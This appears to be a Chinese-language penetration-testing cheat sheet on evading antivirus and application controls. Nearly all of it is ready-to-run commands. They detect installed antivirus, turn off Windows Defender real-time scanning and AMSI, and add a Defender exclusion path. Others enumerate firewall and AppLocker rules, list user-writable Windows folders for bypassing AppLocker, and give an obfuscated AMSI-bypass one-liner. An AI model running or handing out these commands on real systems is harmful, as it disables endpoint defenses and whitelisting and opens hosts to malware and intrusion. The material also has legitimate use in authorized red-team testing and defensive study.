# AV躲避

**发现AV：**

`WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName`

### Windows Defender:

Get-MpComputerStatus    查看状态

Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus    禁用实时扫描

Set-MpPreference -DisableIOAVProtection $true      禁用amsi

Add-MpPreference -ExclusionPath "C:\Windows\Tasks"     task是白名单

防火墙

netsh advfirewall firewall dump   查看防火墙状态和配置

```bash
$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
```

## AppLocker （微软的应用程序白名单技术）

```bash
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### AppLocker bypass

1. ****将文件放在可写路径中（下列文件夹普通用户都可写）****

C:\Windows\Tasks

C:\Windows\Temp

C:\Users\Public

C:\windows\tracing

C:\Windows\Registration\CRMLog

C:\Windows\System32\FxsTmp

C:\Windows\System32\com\dmp

C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys

C:\Windows\System32\spool\PRINTERS

C:\Windows\System32\spool\SERVERS

C:\Windows\System32\spool\drivers\color

C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter

C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)

C:\Windows\SysWOW64\FxsTmp

C:\Windows\SysWOW64\com\dmp

C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter

C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System

**powershell的默认路径：**

```bash
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
```

### AMSI Bypass

```bash
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
```